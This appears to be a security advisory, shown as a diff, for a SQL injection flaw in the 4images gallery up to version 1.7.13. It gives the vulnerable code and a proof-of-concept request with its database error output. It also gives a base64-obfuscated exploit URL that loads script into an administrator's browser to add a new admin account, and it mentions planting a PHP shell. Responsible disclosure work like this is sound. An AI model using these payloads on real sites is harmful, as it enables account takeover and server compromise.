@@ -1,0 +1,79 @@
+# vulnerable app : 4images <= 1.7.13
+# Vendor : www.4homepages.de
+# Author : Ahmed sultan (0x4148)
+# Email : 0x4148@gmail.com
+# Home : 0x4148.com
+
+4images is a powerful web-based image gallery management system. Features
+include comment system,
+user registration and management, password protected administration area
+with browser-based upload and HTML templates for page layout and design.
+The app is vulnerable to Sql injection flaw which can be escalated to new
+administrator add exploit
+Vulnerable code
+File : admin/validateimages.php
+Line 406
+    $sql = "SELECT i.image_id, i.cat_id, i.user_id, i.image_name,
+i.image_date, i.image_media_file".get_user_table_field(", u.",
+"user_name")."
+            FROM ".IMAGES_TEMP_TABLE." i
+            LEFT JOIN ".USERS_TABLE." u ON (".get_user_table_field("u.",
+"user_id")." = i.user_id)
+            WHERE $condition
+            ORDER BY $orderby $direction
+            LIMIT $limitstart, $limitnumber";
+    $result = $site_db->query($sql);
+Input parameter orderby is not sanitized before being passed to the sql
+query which lead to sql injection flaw
+POC
+GET
+/lab/4images1.7.13/4images/admin/validateimages.php?action=validateimages&orderby=extractvalue(1,concat(0x7e,version()))&direction=ASC&limitnumber=10
+HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101
+Firefox/17.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: 4images_lastvisit=1478064418; 4images_userid=1;
+sessionid=ru4g0mqdpd3cj6pub1d0a5kmf4
+
+Will result in
+<br /><font color='#FF0000'><b>DB Error</b></font>: <b>Bad SQL Query</b>:
+SELECT i.image_id, i.cat_id, i.user_id, i.image_name, i.image_date,
+i.image_media_file, u.user_name
+            FROM 4images_images_temp i
+            LEFT JOIN 4images_users u ON (u.user_id = i.user_id)
+            WHERE 1=1
+            ORDER BY extractvalue(1,concat(0x7e,version())) ASC
+            LIMIT 0, 10<br /><b>XPATH syntax error: '~5.5.25a'
+
+To reproduce, add normal user account, add a category and allow users to upload images in it.
+Login with the normal user account and upload an image.
+Try the poc 
+
+Exploitation :
+By the help of JS the sql injection flaw can be used to obtain the current
+csrf token and use it to add new administrator within the admin browser
+session
+Full exploit poc
+admin/validateimages.php?action=validateimages&orderby=extractvalue(1,concat(0x3c7376672f6f6e6c6f61643d6576616c28222f2a222b55524c293e))&direction=ASC&limitnumber=10#*/with(document)body.appendChild(createElement(/script/.source)).src=atob(/Ly9sb2NhbGhvc3QveC5qcw==/.source)
+
+Ly9sb2NhbGhvc3QveC5qcw== is the base64 encoded Javascript url which will be
+executed inside administrator's browser
+
+Impact
+Attacker can inject JS code which result in bypassing the CSRF token ,
+adding new administrator's account
+or even updating allowed extensions and uploading php shell on the
+vulnerable host
+
+Reference(s):
+https://0x4148.com/2016/11/02/4images-1-7-13-sql-injection-administrator-add-exploit/
+
+Disclosure timeline
+1/11 - Vulnerability was reported
+2/11 - Vendor sent fixation to review
+3/11 - Fixed evrsion was retested by me and approved
+3/11 - Vendor scheduled official update release
+10/11 - Public disclosure
